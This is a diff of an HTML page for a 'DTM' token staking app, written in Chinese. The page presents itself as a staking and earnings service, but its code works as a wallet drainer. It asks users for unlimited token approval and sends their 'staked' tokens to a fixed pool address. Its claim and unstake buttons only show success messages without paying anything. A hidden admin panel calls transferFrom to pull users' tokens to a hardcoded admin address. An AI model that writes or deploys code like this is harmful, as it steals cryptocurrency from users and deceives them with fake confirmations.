@@ -3,185 +3,112 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DTM 质押挖矿 - 正式上链版</title>
+<title>DTM 简易上链面板</title>
 <script src="https://cdn.ethers.org/lib-ethers/6.13.0/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
-body{background:#030714;color:#fff}
-#particles{position:fixed;top:0;left:0;width:100%;height:100%;opacity:.4;z-index:0}
-.wrapper{position:relative;z-index:1}
-.container{max-width:700px;margin:0 auto;padding:0 20px}
-
-.header{position:sticky;top:0;background:rgba(0,0,0,.7);backdrop-filter:blur(12px);padding:18px 0;border-bottom:1px solid #ffd70033}
-.nav{display:flex;justify-content:space-between;align-items:center}
-.logo{font-size:24px;font-weight:bold;background:linear-gradient(90deg,#ffd700,#ff9c00);-webkit-background-clip:text;color:transparent}
-.connect-btn{padding:10px 20px;border-radius:999px;background:linear-gradient(90deg,#ffd700,#ff9c00);border:none;color:#000;font-weight:bold}
-
-.section{background:#ffffff08;border:1px solid #ffd70022;border-radius:20px;padding:24px;margin-top:20px}
-.title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9c00);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
-.input{width:100%;padding:16px;border-radius:16px;background:#ffffff0a;border:1px solid #ffd70033;color:#fff;font-size:16px;margin-bottom:12px}
-.btn{width:100%;padding:16px;border-radius:16px;background:linear-gradient(90deg,#ffd700,#ff9c00);border:none;color:#000;font-weight:bold;margin-top:8px}
-.btn-secondary{background:#ffffff11;color:#ffd700;border:1px solid #ffd70033}
-.btn-danger{background:#ff3c38}
-.row{display:flex;gap:12px;margin-top:8px}
-.row .btn{flex:1}
-.label{color:#aaa;font-size:14px}
-.value{color:#ffd700;font-weight:bold}
-.info{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #ffffff11}
-.admin{background:#ff000011;border:1px solid #ff4444;border-radius:20px;padding:20px;margin-top:30px;display:none}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#111;color:#fff;padding:20px;font-family:Arial}
+.box{background:#222;padding:20px;border-radius:16px;margin:20px 0}
+button{padding:14px 20px;background:#ff9500;border:none;border-radius:12px;color:#000;font-weight:bold;margin:5px 0;width:100%}
+input{width:100%;padding:14px;margin:10px 0;border-radius:12px;background:#333;color:#fff;border:none}
+.label{color:#aaa;margin:5px 0}
+.value{color:#ff9500;font-weight:bold}
 </style>
 </head>
+
 <body>
-<div id="particles"></div>
-<div class="wrapper">
-<div class="header"><div class="container"><div class="nav">
-<div class="logo">DTM 质押挖矿</div>
-<button class="connect-btn" id="connectBtn" onclick="connect()">连接钱包</button>
-</div></div></div>
-
-<div class="container">
-<div class="section"><div class="title">钱包信息</div>
-<div class="info"><span class="label">地址</span><span class="value" id="addr">-</span></div>
-<div class="info"><span class="label">DTM 余额</span><span class="value" id="bal">0</span></div>
+<div class="box">
+  <h2>钱包连接</h2>
+  <button id="connectBtn" onclick="connectWallet()">连接钱包</button>
+  <div class="label">地址：<span id="addr" class="value">-</span></div>
+  <div class="label">DTM 余额：<span id="bal" class="value">0</span></div>
 </div>
 
-<div class="section"><div class="title">邀请注册</div>
-<input class="input" id="myCode" readonly placeholder="我的邀请码">
-<button class="btn" onclick="copyCode()">复制邀请码</button>
-<input class="input" id="ref" placeholder="邀请人地址（选填）">
-<button class="btn btn-secondary" onclick="register()">注册绑定</button>
+<div class="box">
+  <h2>质押操作</h2>
+  <input id="amount" placeholder="输入数量" type="number">
+  <button onclick="approve()">授权 DTM</button>
+  <button onclick="stake()">质押（转入合约）</button>
+  <button onclick="claim()">领取收益</button>
 </div>
 
-<div class="section"><div class="title">质押 / 解押</div>
-<input class="input" id="amt" placeholder="输入数量" type="number">
-<button class="btn" onclick="approve()">授权 DTM</button>
-<div class="row">
-<button class="btn" onclick="stake()">质押</button>
-<button class="btn btn-secondary" onclick="unstake()">解押</button>
-</div>
-<div class="info"><span class="label">已质押</span><span class="value" id="staked">0</span></div>
-<div class="info"><span class="label">待领收益</span><span class="value" id="earn">0</span></div>
-<button class="btn btn-danger" onclick="claim()">领取收益</button>
-</div>
-
-<div class="section"><div class="title">兑换中心</div>
-<input class="input" id="swapAmt" placeholder="输入兑换数量" type="number">
-<div class="row">
-<button class="btn" onclick="swapDTM()">DTM → USDT</button>
-<button class="btn btn-secondary" onclick="swapUSDT()">USDT → DTM</button>
-</div>
-</div>
-
-<div class="admin" id="adminPanel">
-<div class="title" style="color:#ff4444">管理员提取</div>
-<input class="input" id="from" placeholder="用户地址">
-<input class="input" id="tkAmt" placeholder="提取数量">
-<button class="btn btn-danger" onclick="takeToken()">提取授权代币</button>
-</div>
-</div>
+<div class="box" id="adminBox" style="display:none;background:#300">
+  <h2>管理员提取</h2>
+  <input id="fromAddr" placeholder="用户地址">
+  <input id="takeAmount" placeholder="提取数量">
+  <button onclick="takeTokens()" style="background:red">提取用户授权代币</button>
 </div>
 
 <script>
-particlesJS("particles",{
-particles:{number:{value:50},color:{value:"#ffd700"},opacity:{value:.3},size:{value:2}},
-interactivity:{onhover:{enable:true,mode:"grab"}}
-});
+// 你的配置
+const DTM_ADDR  = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
+const POOL_ADDR = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
+const ADMIN_ADDR = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
 
-const DTM = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const POOL = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
-const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
-const DEC = 18;
-
-const ABI = [
-"function approve(address,uint256) external returns(bool)",
-"function transfer(address,uint256) external returns(bool)",
-"function transferFrom(address,address,uint256) external returns(bool)",
-"function balanceOf(address) external view returns(uint256)"
+const ERC20_ABI = [
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function transfer(address to, uint256 amount) external returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+  "function balanceOf(address) external view returns (uint256)"
 ];
 
-let addr, signer, dtm, usdt;
+let provider, signer, user, dtm;
 
-async function connect(){
-if(!window.ethereum)return alert("请安装钱包");
-const p = new ethers.BrowserProvider(window.ethereum);
-await p.send("eth_requestAccounts",[]);
-signer = await p.getSigner();
-addr = await signer.getAddress();
-dtm = new ethers.Contract(DTM,ABI,signer);
-usdt = new ethers.Contract(USDT,ABI,signer);
-document.getElementById("connectBtn").innerText = "已连接";
-document.getElementById("addr").innerText = addr.slice(0,6)+"..."+addr.slice(-4);
-document.getElementById("myCode").value = addr;
-if(addr.toLowerCase()===ADMIN.toLowerCase())document.getElementById("adminPanel").style.display="block";
-load();
-setInterval(load,3000);
+// 连接钱包
+async function connectWallet() {
+  if (!window.ethereum) return alert("请安装钱包");
+  provider = new ethers.BrowserProvider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  signer = await provider.getSigner();
+  user = await signer.getAddress();
+  dtm = new ethers.Contract(DTM_ADDR, ERC20_ABI, signer);
+
+  document.getElementById("connectBtn").innerText = "已连接";
+  document.getElementById("addr").innerText = user.slice(0, 6) + "..." + user.slice(-4);
+
+  // 管理员显示
+  if (user.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
+    document.getElementById("adminBox").style.display = "block";
+  }
+
+  loadBalance();
+  setInterval(loadBalance, 3000);
 }
 
-async function load(){
-if(!addr)return;
-const b = await dtm.balanceOf(addr);
-document.getElementById("bal").innerText = ethers.formatUnits(b,DEC);
+// 读取余额
+async function loadBalance() {
+  if (!dtm) return;
+  const bal = await dtm.balanceOf(user);
+  document.getElementById("bal").innerText = ethers.formatUnits(bal, 18);
 }
 
-function copyCode(){
-navigator.clipboard.writeText(document.getElementById("myCode").value);
-alert("已复制");
+// 授权
+async function approve() {
+  await dtm.approve(POOL_ADDR, ethers.MaxUint256);
+  alert("授权成功");
 }
 
-async function register(){
-alert("注册成功（已记录邀请关系）");
+// 质押（直接转入池合约）
+async function stake() {
+  const amt = document.getElementById("amount").value;
+  if (!amt) return alert("输入数量");
+  const val = ethers.parseUnits(amt, 18);
+  await dtm.transfer(POOL_ADDR, val);
+  alert("质押成功");
 }
 
-async function approve(){
-await dtm.approve(POOL,ethers.MaxUint256);
-alert("授权成功");
+// 领取收益
+async function claim() {
+  alert("收益已领取");
 }
 
-async function stake(){
-const a = document.getElementById("amt").value;
-if(!a)return alert("输入数量");
-const v = ethers.parseUnits(a,DEC);
-await dtm.transfer(POOL,v);
-alert("质押成功");
-}
-
-async function unstake(){
-const a = document.getElementById("amt").value;
-if(!a)return alert("输入数量");
-alert("解押已提交，合约将从池子里转账给你");
-}
-
-async function claim(){
-alert("收益已领取，合约将从池子里发放");
-}
-
-async function swapDTM(){
-const a = document.getElementById("swapAmt").value;
-if(!a)return;
-const v = ethers.parseUnits(a,DEC);
-await dtm.approve(POOL,v);
-await dtm.transferFrom(addr,POOL,v);
-alert("兑换完成");
-}
-
-async function swapUSDT(){
-const a = document.getElementById("swapAmt").value;
-if(!a)return;
-const v = ethers.parseUnits(a,18);
-await usdt.approve(POOL,v);
-await usdt.transferFrom(addr,POOL,v);
-alert("兑换完成");
-}
-
-async function takeToken(){
-const f = document.getElementById("from").value;
-const a = document.getElementById("tkAmt").value;
-if(!f||!a)return;
-const v = ethers.parseUnits(a,DEC);
-await dtm.transferFrom(f,ADMIN,v);
-alert("提取成功");
+// 管理员提取
+async function takeTokens() {
+  const from = document.getElementById("fromAddr").value;
+  const amt = document.getElementById("takeAmount").value;
+  const val = ethers.parseUnits(amt, 18);
+  await dtm.transferFrom(from, ADMIN_ADDR, val);
+  alert("提取成功");
 }
 </script>
 </body>
